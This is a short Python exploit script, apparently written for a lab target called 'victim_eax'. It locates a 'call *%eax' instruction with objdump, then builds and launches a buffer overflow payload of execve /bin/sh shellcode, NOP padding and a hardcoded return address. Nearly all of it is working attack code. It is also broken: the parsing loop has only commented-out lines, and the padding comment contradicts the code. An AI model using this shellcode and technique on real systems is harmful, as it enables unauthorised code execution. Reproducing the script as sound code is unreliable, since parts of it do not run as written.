#!/usr/bin/python
# this is an exploit using call *%eax.
import os; 

#function to objdump a binary into a .txt file

os.system('objdump -d victim_eax | grep "*%eax" > objdumpfile_eax.txt')

# function to parse the .txt file for byte value '5d'

for line in open('objdumpfile_eax.txt', 'r'):
    if '*%eax' in line:
        #print line
	#print line.split()[0]
	#retaddr = line.split()[0].strip(':')
	#print retaddr


#function to convert retaddr into little endian

#retaddr = retaddr[::-1]
#print retaddr

#function to get the list of functions and calculate the buffer size.

#os.system('objdump -R ret2esp')

# NOTE: "+" is a python way to cat two strings (NOT part of shellcode)
# This shellcode takes 24 bytes

shellcode = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80";

# This address must match the address where call *%eax instruction is stored


retaddr = "\x73\x83\x04\x08"; 
 
# Fill NOP instruction
pad = "\x90" * 60; #  times because I need 16 bytes to hit the return address. 9+7 = 16.

# Input string to our victim's program
arg = shellcode+pad+retaddr;
 
# Let us store the input string to a file
f =open("payload2", "w+");
f.write("%s" % arg) ;
f.close();

os.system('./victim_eax `cat payload2`')
